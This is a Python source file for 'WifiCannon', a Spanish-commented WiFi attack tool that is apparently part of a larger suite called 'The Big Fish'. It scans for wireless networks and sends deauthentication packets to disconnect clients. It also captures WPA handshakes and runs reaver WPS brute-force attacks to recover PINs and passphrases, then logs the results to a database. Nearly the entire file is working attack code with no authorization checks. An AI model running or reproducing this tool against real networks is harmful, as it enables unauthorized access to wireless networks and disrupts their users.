#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WifiCannon - Herramienta de ataque WiFi para captura de handshakes
Módulo para The Big Fish
"""

import sys
import os
import json
import argparse
import subprocess
import time
import re
from datetime import datetime
import logging

# Configurar logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')
logger = logging.getLogger(__name__)

# Añadir el directorio raíz al path para importar core
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

class WifiCannon:
    """Clase principal de WifiCannon para ataques WiFi."""
    
    def __init__(self, interface='wlan0', target_bssid=None, channel=None, output_dir=None):
        """
        Inicializa WifiCannon.
        
        Args:
            interface: Interfaz de red en modo monitor
            target_bssid: BSSID del objetivo (opcional)
            channel: Canal del objetivo (opcional)
            output_dir: Directorio para guardar capturas
        """
        self.interface = interface
        self.target_bssid = target_bssid
        self.channel = channel
        self.output_dir = output_dir or f"wifi_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.handshakes = []
        self.is_running = False
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Verificar permisos
        if os.geteuid() != 0:
            logger.warning("⚠️ No se ejecuta como root. Algunas funciones pueden no funcionar.")
    
    def _check_interface(self):
        """Verifica que la interfaz esté en modo monitor."""
        try:
            # Verificar que la interfaz existe
            result = subprocess.run(['iwconfig', self.interface], capture_output=True, text=True)
            if 'Mode:Monitor' not in result.stdout and 'Mode:Master' not in result.stdout:
                logger.warning(f"⚠️ Interfaz {self.interface} no está en modo monitor")
                return False
            return True
        except Exception as e:
            logger.error(f"❌ Error verificando interfaz: {e}")
            return False
    
    def _set_channel(self):
        """Configura el canal de la interfaz."""
        if self.channel:
            try:
                subprocess.run(['iwconfig', self.interface, 'channel', str(self.channel)], 
                             check=True, capture_output=True)
                logger.info(f"📡 Canal configurado: {self.channel}")
                return True
            except Exception as e:
                logger.error(f"❌ Error configurando canal: {e}")
                return False
        return True
    
    def _scan_networks(self, duration=10):
        """Escanea redes WiFi disponibles."""
        logger.info(f"🔍 Escaneando redes WiFi durante {duration} segundos...")
        
        try:
            # Iniciar escaneo
            subprocess.run(['airodump-ng', self.interface, '--output-format', 'csv', 
                          '--write', os.path.join(self.output_dir, 'scan')], 
                         timeout=duration, capture_output=True)
            
            # Procesar resultados
            csv_file = os.path.join(self.output_dir, 'scan-01.csv')
            if os.path.exists(csv_file):
                networks = self._parse_scan_results(csv_file)
                return networks
        except subprocess.TimeoutExpired:
            pass
        
        return []
    
    def _parse_scan_results(self, csv_file):
        """Parsea los resultados del escaneo airodump-ng."""
        networks = []
        try:
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            in_networks = False
            for line in lines:
                line = line.strip()
                if line.startswith('BSSID'):
                    in_networks = True
                    continue
                if in_networks and line and not line.startswith('Station'):
                    parts = line.split(',')
                    if len(parts) >= 6:
                        network = {
                            'bssid': parts[0].strip(),
                            'channel': parts[3].strip() if len(parts) > 3 else '0',
                            'essid': parts[13].strip() if len(parts) > 13 else 'Hidden',
                            'encryption': parts[5].strip() if len(parts) > 5 else 'unknown'
                        }
                        networks.append(network)
        except Exception as e:
            logger.error(f"❌ Error parseando resultados: {e}")
        
        return networks
    
    def _capture_handshake(self, bssid=None, essid=None, duration=60):
        """Captura handshake de un objetivo específico."""
        target = bssid or self.target_bssid
        if not target:
            logger.error("❌ No se especificó BSSID objetivo")
            return None
        
        logger.info(f"🎯 Iniciando captura de handshake para: {target}")
        
        # Nombre de archivo para la captura
        cap_file = os.path.join(self.output_dir, f'handshake_{target.replace(":", "_")}')
        
        # Configurar canal
        if self.channel:
            self._set_channel()
        
        # Iniciar airodump-ng
        try:
            cmd = [
                'airodump-ng',
                self.interface,
                '--bssid', target,
                '--channel', str(self.channel or 1),
                '--write', cap_file,
                '--output-format', 'pcap'
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            logger.info(f"⏳ Capturando handshake durante {duration} segundos...")
            
            # Esperar un tiempo para capturar
            time.sleep(duration)
            
            # Intentar forzar handshake con deauth
            if self.target_bssid:
                logger.info("🔨 Enviando paquetes de deautenticación...")
                deauth_cmd = [
                    'aireplay-ng',
                    '--deauth', '10',
                    '--bssid', target,
                    self.interface
                ]
                try:
                    subprocess.run(deauth_cmd, timeout=10, capture_output=True)
                except:
                    pass
            
            # Detener airodump
            process.terminate()
            process.wait(timeout=5)
            
            # Verificar si se capturó el handshake
            pcap_file = f"{cap_file}-01.cap"
            if os.path.exists(pcap_file):
                # Verificar con aircrack-ng si hay handshake
                try:
                    result = subprocess.run(['aircrack-ng', pcap_file], 
                                          capture_output=True, text=True)
                    if '1 handshake' in result.stdout:
                        logger.info(f"✅ Handshake capturado exitosamente!")
                        handshake_info = {
                            'bssid': target,
                            'essid': essid,
                            'file': pcap_file,
                            'capture_time': datetime.now().isoformat(),
                            'type': 'handshake'
                        }
                        self.handshakes.append(handshake_info)
                        return handshake_info
                    else:
                        logger.warning("⚠️ No se encontró handshake en la captura")
                except Exception as e:
                    logger.error(f"❌ Error verificando handshake: {e}")
            
            return None
            
        except Exception as e:
            logger.error(f"❌ Error durante la captura: {e}")
            return None
    
    def _attack_wps(self, bssid):
        """Realiza ataque WPS (si está disponible)."""
        logger.info(f"🔨 Iniciando ataque WPS a: {bssid}")
        
        try:
            cmd = ['reaver', '--bssid', bssid, '--channel', str(self.channel or 1),
                   '--interface', self.interface, '--verbose']
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                     text=True)
            
            # Capturar salida en tiempo real
            output = []
            for line in process.stdout:
                output.append(line)
                logger.info(f"[WPS] {line.strip()}")
                if 'PIN found' in line or 'WPA PSK found' in line:
                    break
            
            process.terminate()
            
            # Parsear resultados
            if output:
                for line in output:
                    if 'PIN found' in line:
                        pin = re.search(r'PIN found: (\d+)', line)
                        if pin:
                            return {'success': True, 'pin': pin.group(1)}
                    elif 'WPA PSK found' in line:
                        psk = re.search(r'WPA PSK found: (\S+)', line)
                        if psk:
                            return {'success': True, 'password': psk.group(1)}
            
        except Exception as e:
            logger.error(f"❌ Error en ataque WPS: {e}")
        
        return {'success': False}
    
    def run(self, mode='capture', duration=60):
        """Ejecuta WifiCannon en el modo especificado."""
        logger.info(f"🔱 Iniciando WifiCannon en modo: {mode}")
        logger.info("=" * 50)
        
        if not self._check_interface():
            logger.error("❌ Interfaz no válida o no en modo monitor")
            return {'error': 'Interface not in monitor mode'}
        
        results = {
            'mode': mode,
            'timestamp': datetime.now().isoformat(),
            'interface': self.interface,
            'target_bssid': self.target_bssid,
            'results': []
        }
        
        if mode == 'scan':
            # Modo escaneo
            networks = self._scan_networks(duration)
            results['networks'] = networks
            logger.info(f"📡 Escaneo completado: {len(networks)} redes encontradas")
            
            # Guardar resultados
            self._save_scan_results(networks)
            
        elif mode == 'capture':
            # Modo captura de handshake
            if not self.target_bssid:
                logger.error("❌ Se requiere BSSID objetivo para captura")
                return {'error': 'Target BSSID required'}
            
            # Obtener ESSID si no se proporcionó
            essid = None
            networks = self._scan_networks(5)
            for net in networks:
                if net['bssid'] == self.target_bssid:
                    essid = net['essid']
                    self.channel = self.channel or int(net['channel'])
                    break
            
            # Capturar handshake
            handshake = self._capture_handshake(self.target_bssid, essid, duration)
            if handshake:
                results['results'].append(handshake)
                self._save_handshake(handshake)
            else:
                logger.warning("⚠️ No se pudo capturar handshake")
        
        elif mode == 'wps':
            # Modo ataque WPS
            if not self.target_bssid:
                logger.error("❌ Se requiere BSSID objetivo para ataque WPS")
                return {'error': 'Target BSSID required'}
            
            wps_result = self._attack_wps(self.target_bssid)
            results['wps_result'] = wps_result
            self._save_wps_result(wps_result)
        
        logger.info("=" * 50)
        logger.info(f"✅ WifiCannon completado")
        
        return results
    
    def _save_scan_results(self, networks):
        """Guarda los resultados del escaneo."""
        scan_file = os.path.join(self.output_dir, f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(scan_file, 'w') as f:
            json.dump(networks, f, indent=2)
        logger.info(f"💾 Escaneo guardado en: {scan_file}")
        
        # Guardar en base de datos si está disponible
        try:
            from core.database import FishDatabase
            db_path = os.environ.get('THE_BIG_FISH_DB', 'data/fish.db')
            db = FishDatabase(db_path)
            
            for net in networks:
                if net['bssid']:
                    # Verificar si ya existe
                    existing = db.get_handshakes(limit=1)
                    if not any(h['bssid'] == net['bssid'] for h in existing):
                        db.save_handshake(
                            bssid=net['bssid'],
                            essid=net['essid'],
                            channel=int(net['channel']) if net['channel'].isdigit() else None,
                            metadata={'scan_info': net}
                        )
            db.close()
        except Exception as e:
            logger.warning(f"No se pudo guardar en base de datos: {e}")
    
    def _save_handshake(self, handshake):
        """Guarda información del handshake."""
        hs_file = os.path.join(self.output_dir, f"handshake_info.json")
        with open(hs_file, 'w') as f:
            json.dump(handshake, f, indent=2)
        logger.info(f"💾 Handshake guardado en: {hs_file}")
        
        # Guardar en base de datos
        try:
            from core.database import FishDatabase
            db_path = os.environ.get('THE_BIG_FISH_DB', 'data/fish.db')
            db = FishDatabase(db_path)
            
            db.save_handshake(
                bssid=handshake['bssid'],
                essid=handshake.get('essid'),
                file_path=handshake['file'],
                metadata={'capture_time': handshake['capture_time']}
            )
            
            # Actualizar escaneo si está en curso
            if 'THE_BIG_FISH_SCAN_ID' in os.environ:
                scan_id = int(os.environ.get('THE_BIG_FISH_SCAN_ID'))
                db.update_scan(scan_id, status='completed', results=handshake)
            
            db.close()
        except Exception as e:
            logger.warning(f"No se pudo guardar en base de datos: {e}")
    
    def _save_wps_result(self, wps_result):
        """Guarda resultados del ataque WPS."""
        wps_file = os.path.join(self.output_dir, f"wps_result.json")
        with open(wps_file, 'w') as f:
            json.dump(wps_result, f, indent=2)
        logger.info(f"💾 Resultado WPS guardado en: {wps_file}")

def main():
    """Función principal para ejecución desde línea de comandos."""
    parser = argparse.ArgumentParser(description='WifiCannon - Herramienta de ataque WiFi')
    parser.add_argument('--interface', default='wlan0', help='Interfaz de red (default: wlan0)')
    parser.add_argument('--bssid', help='BSSID objetivo')
    parser.add_argument('--channel', type=int, help='Canal del objetivo')
    parser.add_argument('--mode', choices=['scan', 'capture', 'wps'], default='capture', 
                       help='Modo de operación')
    parser.add_argument('--duration', type=int, default=60, help='Duración en segundos (default: 60)')
    parser.add_argument('--output', help='Directorio de salida')
    
    args = parser.parse_args()
    
    # Ejecutar WifiCannon
    cannon = WifiCannon(
        interface=args.interface,
        target_bssid=args.bssid,
        channel=args.channel,
        output_dir=args.output
    )
    
    results = cannon.run(mode=args.mode, duration=args.duration)
    
    # Imprimir resumen
    print("\n📊 RESUMEN:")
    print(f"  Modo: {args.mode}")
    print(f"  Resultados guardados en: {cannon.output_dir}")
    
    if args.mode == 'scan' and 'networks' in results:
        print(f"  Redes encontradas: {len(results['networks'])}")
    elif args.mode == 'capture' and results.get('results'):
        print(f"  Handshakes capturados: {len(results['results'])}")
    elif args.mode == 'wps' and results.get('wps_result', {}).get('success'):
        print(f"  ✅ WPS exitoso: PIN = {results['wps_result'].get('pin', 'N/A')}")
        if results['wps_result'].get('password'):
            print(f"  Password: {results['wps_result']['password']}")

if __name__ == "__main__":
    main()
